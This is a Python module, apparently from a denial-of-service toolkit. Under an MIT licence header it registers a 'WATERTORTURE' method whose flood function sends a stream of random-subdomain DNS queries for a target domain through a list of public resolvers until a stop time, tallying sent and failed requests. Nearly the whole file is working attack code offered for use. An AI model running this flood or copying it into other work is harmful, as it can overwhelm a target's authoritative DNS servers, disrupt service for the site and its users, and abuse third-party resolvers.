'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

import time, dns.resolver
from src.core import Core
from src.utils import *
from src.useragent import *
from urllib.parse import urlparse

resolver = dns.resolver.Resolver(configure=False)
resolver.nameservers = [ # list of dns servers
    '8.8.8.8',
    '8.8.4.4',
    '1.1.1.1',
    '1.0.0.1',
    '9.9.9.9',
    '149.112.112.112',
    '64.6.64.6',
    '64.6.65.6',
    '91.239.100.100',
    '185.228.168.168',
    '77.88.8.7',
    '156.154.70.1',
    '176.103.130.130',
    '176.103.130.131',
    '185.228.168.9',
    '185.228.169.9',
    '8.26.56.26',
    '208.67.222.222',
    '208.67.220.220'
]

def flood(attack_id, url, stoptime) -> None:
    domain = urlparse(url).netloc

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue
        
        try:

            dns.resolver.resolve(f'{choice(keywords).replace(" ",".").lower()}.{domain}', 'A')

            Core.infodict[attack_id]['req_sent'] += 1
            
        except dns.resolver.NXDOMAIN: # missing domain? yeah indeed
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'WATERTORTURE': {
        'info': 'DNS watertorture attack',
        'func': flood
    }
})